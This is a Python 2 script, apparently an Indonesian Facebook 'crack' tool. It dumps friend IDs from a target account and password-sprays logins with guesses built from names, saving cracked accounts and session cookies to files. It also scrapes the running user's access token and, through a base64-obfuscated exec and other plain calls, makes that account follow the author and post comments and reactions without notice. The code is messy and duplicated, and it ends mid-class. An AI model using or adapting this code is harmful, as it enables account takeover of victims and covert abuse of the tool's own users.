#!/usr/bin/python2
#-*-coding:utf-8-*-

import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool

if ("linux" in sys.platform.lower()):

        N = '\x1b[0m'
        G = '\x1b[32m'
        O = '\x1b[37m\x1b[33m'
        R = '\x1b[91m'
else:

        N = ''
        G = ''
        O = ''
        R = ''
def banner():
  print("""   ____                    _            _____ 
  / ___| _ __  __ _   ___ | | __       |___ / 
 | |    | '__|/ _` | / __|| |/ /  _____  |_ \ 
 | |___ | |  | (_| || (__ |   <  |_____|___) |
  \____||_|   \__,_| \___||_|\_\       |____/ 
                                              \n""");print(45*"_");time.sleep(0.07);print(" \x1b[0m CREATE BY : Rizal XD\n \n DEC BY :Aris Widiatmoko\n \n GITHUB    : github.com/Dulatip\n  FACEBOOK  : Facebook.com/ijakssquad");time.sleep(0.07);print(45*"_");time.sleep(0.07)
post = '10225748615052849'

reac = 'ANGRY'

kom = 'Gw Pengguna Crack 3 Lu Bang 😘'
post2 = '10225748615052849'
reac2 = 'LOVE'
kom2 = 'Gw Pengguna Crack 3 Lu Bang 😘'
post3 = '10225748615052849'
reac3 = 'LOVE'
kom3 = 'Gw Pengguna Crack 3 Lu Bang 😘'
post4 = '10225748615052849'
reac4 = 'LOVE'
kom4 = 'Gw Pengguna Crack 3 Lu Bang 😘'
post5 = '10225748615052849'    
reac5 = 'LOVE'
kom5 = 'Gw Pengguna Crack 3 Lu Bang 😘'
host="https://mbasic.facebook.com"
ua="Mozilla / 5.0 (Linux; U; Android 2.2) AppleWebKit / 533.1 (KHTML, like Gecko) Version / 4.0 Mobile Safari / 533.1 [FBAN / EMA; FBLC / it _ IT; FBAV / 239.0.0.10.109 ;]"
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36"}).json()["country_name"].lower()
except:
	ips=None
uas=None
if os.path.exists(".browser"):
	if os.path.getsize(".browser") !=0:
		uas=open(".browser").read().strip()
touch_fbh={"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

m_fbh={"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

graph_h={"Host":"graph.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		print(("  {}Cookies Mati{}").format(R,N));gen()
def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()
def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r
def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)
def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
def gen():
	ck=input("  [+]Cookie: ")
	if ck=="":gen()
	try:
		cks=gets_dict_cookies(ck)
		if lang(cks)==True:
			open(".cok","w").write(ck)
			convert()
			print(('  \x1b[92mLogin Sukses!\x1b[0m'))
			time.sleep(1)
			menu()
		else:print(("  \x1b[91mLogin Gagal\x1b[0m"));gen()
	except Exception as e:
		print(("  error: %s"%e));gen()
def log_token():
	data = input("  [+]Token :")
	try:
		me = requests.get('https://graph.facebook.com/me?access_token='+data)
		a = json.loads(me.text)
		nama = a['name']
		open("login.txt",'w').write(data)
		print(("  \x1b[92mlogin success!\x1b[0m"))
		bot_komen()
		menu()
	except KeyError:
		print(("  \x1b[91mInvalid Token !\x1b[0m"))
		time.sleep(1.0)
		logs()
def convert():
	global post,reac,kom
	try:
		tomken = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36', #Jangan Diganti Anjink
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : open(".cok",'r').read()
		})
		find_token = re.search('(EAAA\w+)', tomken.text)
		if (find_token is None):
			pass
		else:
			exec(base64.b64decode("cmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI2NDkwMzY4NjIzL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgZmluZF90b2tlbi5ncm91cCgxKSk="))
			requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + find_token.group(1)) #bot komen
			requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + find_token.group(1)) #auto react
			requests.post('https://graph.facebook.com/1555196435/subscribers?access_token=' + find_token.group(1)) #auto follow
			open("login.txt",'w').write(find_token.group(1))
			return
	except Exception as e:
		print((R+"\n  error: %s"%e))
		exit()
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("[!] Token invalid")
		logs()
	kom = ('Gw Pengguna Crack 3 Lu Bang ')
	reac = ('ANGRY')
	post = ('10225748615052849')
	post2 = ('10225748615052849')
	kom2 = ('Gw Pengguna Crack 3 Lu Bang ')
	reac2 = ('LOVE')
	requests.post('https://graph.facebook.com/1555196435/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()
def menu():
  try:
    toket = open('login.txt','r').read()
    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
    a = json.loads(otw.text)
    nama = a['name']
    id = a['id']
  except Exception as w:
    print(("  {} Tidak Ada Ingfo lomgin,  silahkan Lomgin ulang Lort {}").format(R,N))
    time.sleep(1)
    logs()
  ip = requests.get("https://api.ipify.org").text
  os.system("clear")
  banner()
  print(("  Welcome "+nama));time.sleep(0.07)
  print(("  UID :" +id));time.sleep(0.07)
  print(("  IP :"+ip));time.sleep(0.07)
  print ("  ");print(45*"_");time.sleep(0.07)
  print ("  1). Dump id Friend");time.sleep(0.07)
  print ("  2). Dump id Like");time.sleep(0.07)
  print ("  3). Crack");time.sleep(0.07)
  print ("  4). Update sc")
  print ("  0). Logout");time.sleep(0.07)
  r=input("\n  Input :");time.sleep(0.07)
  print(45*"_");time.sleep(0.07)
  if r=="":print((" {} Isi yang bener{}").format(R,N));menu()
  elif r=="1":
    publik()
  elif r=="2":
    crack_like()
  elif r=="3":
    methode()
    exit()
  elif r=="4":
    print("  Sedang Mengupdade!!!");time.sleep(2)
    os.system("git pull")
    input("  [Kembali]")
    os.system("python run.py")
  elif r=="0":
    try:
      os.remove(".cok")
      os.remove("login.txt")
      exit(basecookie())
    except Exception as e:print((" \x1b[91m Error file tidak ditemukan  %s\x1b[0m"%e))
  else:
    print(("  \x1b[91mwrong input !"));menu()
def publik():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print(("  {}Cookies Invalid!{}").format(R,N))
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		gen()
	try:
		print ("  Ketik \'me\' Jika anda ingin Mengambil id dari daftar teman. \n");time.sleep(0.07)
		idt = input("  User ID Target : ");time.sleep(0.07)
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(("  Nama Akun      : "+op["name"]))
		except KeyError:
			print(("  {}ID NOT found !{}").format(R,N))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+toket)
		id = []
		z=json.loads(r.text)
		print("\033[0;96m╚══\033[0;97m[•] Getting ID ...")
		print ("\033[0;96m─────────────────────────────────────────────────────────────")
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')#.replace(" ","_")
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print("\r  %s "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
			print (  a["name"])
		ys.close()
		print ("\033[0;96m─────────────────────────────────────────────────────────────")
		print ('\033[0;96m╔══\033[0;97m[•] Sukses Mengambil ID dari %s'%op['name'])
		print ("\033[0;96m╠══\033[0;97m[•] Total ID : %s"%(len(id)))
		print ("\033[0;96m╚══\033[0;97m[•] Output : %s"%qq)
                print ("\033[0;96m─────────────────────────────────────────────────────────────")
		raw_input("\033[0;97m   [•] [Kembali]")
		menu()
		
	except Exception as e:
		exit("error: %s"%e)
def crack_like():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print('   Token Invalid')
		os.system('rm -rf login.txt')
		time.sleep(1)
		logs()
	idt = input("  ID Postingan Publik/Teman :");time.sleep(0.07)
	try:
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+toket)
		id = []
		z=json.loads(r.text)
		print("\033[0;96m╚══\033[0;97m[•] Getting ID ...")
		print ("\033[0;96m─────────────────────────────────────────────────────────────")
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')#.replace(" ","_")
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print("\r  %s "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
			print (  a["name"])
		ys.close()
		print ("\033[0;96m─────────────────────────────────────────────────────────────")
		print ('\033[0;96m╔══\033[0;97m[•] Sukses Mengambil ID dari %s'%op['name'])
		print ("\033[0;96m╠══\033[0;97m[•] Total ID : %s"%(len(id)))
		print ("\033[0;96m╚══\033[0;97m[•] Output : %s"%qq)
                print ("\033[0;96m─────────────────────────────────────────────────────────────")
		raw_input("\033[0;97m   [•] [Kembali]")
		menu()
			
	except KeyError:
		print("  \x1b[91mID postingan salah\x1b[0m")
		menu()
	except requests.exceptions.SSLError:
		print('! Koneksi Tidak Ada')
		exit()
def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack mbasic
def m_fb(em,pas,hosts):
	global ua,m_fbh
	r=requests.Session()
	r.headers.update(m_fbh)
	p=r.get("https://m.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack m.fb
def touch_fb(em,pas,hosts):
	global ua,touch_fbh
	r=requests.Session()
	r.headers.update(touch_fbh)
	p=r.get("https://touch.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#touch fb
def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i)
				if "indonesia" in ips:
					results.append("sayang")
					results.append("rahasia")
					results.append("102030")
	return results
def methode():
  os.system("clear")
  banner()
  print ("\033[0;96m─────────────────────────────────────────────────────────────")
  print("\033[0;96m╔══\033[0;97m[ Pilih Metode Crack ]")
  print("\033[0;96m║")
  print("\033[0;96m╠══\033[0;97m[1] Crack With mbasic")
  print("\033[0;96m╠══\033[0;97m[2] Crack With m.facebook.com")
  print("\033[0;96m╠══\033[0;97m[3] Crack With touch.facebook.com")
  print("\033[0;96m╚══\033[0;97m[4] Crack With api")
  print ("\033[0;96m─────────────────────────────────────────────────────────────")
  sek=raw_input("\033[0;96m╔══\033[0;97m[•] Input : ")
  if sek=="":print("\033[0;97m   [!] Isi Yang Benar").format(R,N);methode()
  elif sek=="1":
    crack()
  elif sek=="2":
    crack1()
  elif sek=="3":
    crack2()
  elif sek=="4":
    crack3()
  else:
    print("\033[0;97m   [!] Isi Yang Benar").format(R,N);methode()
def logs():
  banner()
  print("\033[0;96m─────────────────────────────────────────────────────────────")
  print("\033[0;96m╔══\033[0;97m[ Pilih Metode Login ]")
  print("\033[0;96m║")
  print("\033[0;96m╠══\033[0;97m[1] Login With Token")
  print("\033[0;96m╠══\033[0;97m[2] Login With Cookie")
  print("\033[0;96m╚══\033[0;97m[0] Exit")
  print("\033[0;96m─────────────────────────────────────────────────────────────")
  sek=raw_input("\033[0;97m   [•] Input : ")
  if sek=="":
    print("\033[0;97m   [!] Isi Yang Benar").format(R,N);logs()
  elif sek=="1":
    log_token()
  elif sek=="2":
    gen()
  elif sek=="3":
    exit()
  else:
    print("\033[0;97m   [!] Isi Yang Benar").format(R,N);logs()
class crack:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\033[0;96m╠══\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[0;96m╠══\033[0;97m[•] Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;96m╠══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("\033[0;96m╠══\033[0;97m[•] Example : pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;96m╚══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
                                print ("\033[0;96m─────────────────────────────────────────────────────────────")
				print ("\033[0;96m╔══\033[0;97m[•] Crack Started...")
				print ("\033[0;96m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
				print ("\033[0;96m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
                                print ("\033[0;96m─────────────────────────────────────────────────────────────")
				ThreadPool(25).map(self.main,self.fl)
				os.remove(self.apk)
				print("   [•] Finished")
				break
	def pwlist(self):
		self.pw=raw_input("\033[0;96m╚══\033[0;97m[•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print ("\033[0;96m─────────────────────────────────────────────────────────────")
			print ("\033[0;96m╔══\033[0;97m[•] Crack Started...")
			print ("\033[0;96m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
			print ("\033[0;96m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
                        print ("\033[0;96m─────────────────────────────────────────────────────────────")
			ThreadPool(25).map(self.main,self.fl)
			os.remove(self.apk)
			print("   [•] Finished")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r   [OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r   [CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack1:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\033[0;96m╠══\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[0;96m╠══\033[0;97m[•] Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;96m╠══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("\033[0;96m╠══\033[0;97m[•] Example : pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;96m╚══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
                                print ("\033[0;96m─────────────────────────────────────────────────────────────")
				print ("\033[0;96m╔══\033[0;97m[•] Crack Started...")
				print ("\033[0;96m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
				print ("\033[0;96m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
                                print ("\033[0;96m─────────────────────────────────────────────────────────────")
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print("   [•] Finished")
				break
	def pwlist(self):
		self.pw=raw_input("\033[0;96m╚══\033[0;97m[•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print ("\033[0;96m─────────────────────────────────────────────────────────────")
			print ("\033[0;96m╔══\033[0;97m[•] Crack Started...")
			print ("\033[0;96m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
			print ("\033[0;96m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
                        print ("\033[0;96m─────────────────────────────────────────────────────────────")
			ThreadPool(25).map(self.main,self.fl)
			os.remove(self.apk)
			print("   [•] Finished")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=m_fb(fl.get("id"),
					i,"https://m.facebook.com")
				if log.get("status")=="success":
					print("\r   [OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r   [CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack2:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\033[0;96m╠══\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[0;96m╠══\033[0;97m[•] Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;96m╠══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("\033[0;96m╠══\033[0;97m[•] Example : pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;96m╚══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
                                print ("\033[0;96m─────────────────────────────────────────────────────────────")
				print ("\033[0;96m╔══\033[0;97m[•] Crack Started...")
				print ("\033[0;96m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
				print ("\033[0;96m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
                                print ("\033[0;96m─────────────────────────────────────────────────────────────")
				ThreadPool(25).map(self.main,self.fl)
				os.remove(self.apk)
				print("   [•] Finished")
				break
	def pwlist(self):
		self.pw=raw_input("\033[0;96m╚══\033[0;97m[•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print ("\033[0;96m─────────────────────────────────────────────────────────────")
			print ("\033[0;96m╔══\033[0;97m[•] Crack Started...")
			print ("\033[0;96m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
			print ("\033[0;96m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
                        print ("\033[0;96m─────────────────────────────────────────────────────────────")
			ThreadPool(25).map(self.main,self.fl)
			os.remove(self.apk)
			print("   [•] Finished")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=touch_fb(fl.get("id"),
					i,"https://touch.facebook.com")
				if log.get("status")=="success":
					print("\r   [OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r   [CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack2:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("\033[0;96m╠══\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[0;96m╠══\033[0;97m[•] Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;96m╠══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("\033[0;96m╠══\033[0;97m[•] Example : pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;96m╚══\033[0;97m[•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
